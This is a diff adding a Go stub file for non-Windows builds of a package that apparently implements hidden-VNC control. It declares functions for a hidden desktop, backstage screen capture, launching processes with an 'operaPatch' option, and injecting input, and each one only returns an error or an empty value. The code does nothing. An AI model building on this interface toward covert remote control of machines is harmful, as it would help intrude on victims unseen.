@@ -1,0 +1,95 @@
+//go:build !windows
+
+package capture
+
+import (
+	"errors"
+	"image"
+)
+
+func InitializeHVNCDesktop() error {
+	return errors.New("HVNC not supported on this platform")
+}
+
+func CleanupHVNCDesktop() {}
+
+func SetHVNCCursorCapture(enabled bool) {}
+
+func SetHVNCDXGIEnabled(enabled bool) {}
+
+func GetHVNCDXGIEnabled() bool { return false }
+
+func SetHVNCUIAEnabled(enabled bool) {}
+
+func GetHVNCUIAEnabled() bool { return false }
+
+func BackstageCaptureDisplay(display int) (*image.RGBA, error) {
+	return nil, errors.New("HVNC not supported on this platform")
+}
+
+func HVNCMonitorCount() int {
+	return 0
+}
+
+func StartHVNCProcess(filePath string, operaPatch bool, display int) error {
+	return errors.New("HVNC not supported on this platform")
+}
+
+func HVNCInputMouseMove(display int, x, y int32) error {
+	return errors.New("HVNC not supported on this platform")
+}
+
+func HVNCInputMouseDown(button int) error {
+	return errors.New("HVNC not supported on this platform")
+}
+
+func HVNCInputMouseUp(button int) error {
+	return errors.New("HVNC not supported on this platform")
+}
+
+func HVNCInputKeyDown(vk uint16) error {
+	return errors.New("HVNC not supported on this platform")
+}
+
+func HVNCInputKeyUp(vk uint16) error {
+	return errors.New("HVNC not supported on this platform")
+}
+
+func HVNCInputMouseWheel(delta int32) error {
+	return errors.New("HVNC not supported on this platform")
+}
+
+func HVNCAutoStartExplorer() error {
+	return errors.New("HVNC not supported on this platform")
+}
+
+func HVNCKillAll() error {
+	return errors.New("HVNC not supported on this platform")
+}
+
+type HVNCWindowInfo struct {
+	HWND        uintptr
+	Title       string
+	X           int
+	Y           int
+	Width       int
+	Height      int
+	PID         uint32
+	ProcessName string
+	Monitor     int
+	Visible     bool
+}
+
+type HVNCMonitorInfo struct {
+	Index   int
+	Name    string
+	X       int
+	Y       int
+	Width   int
+	Height  int
+	Primary bool
+}
+
+func HVNCEnumWindows() ([]HVNCWindowInfo, []HVNCMonitorInfo) {
+	return nil, nil
+}
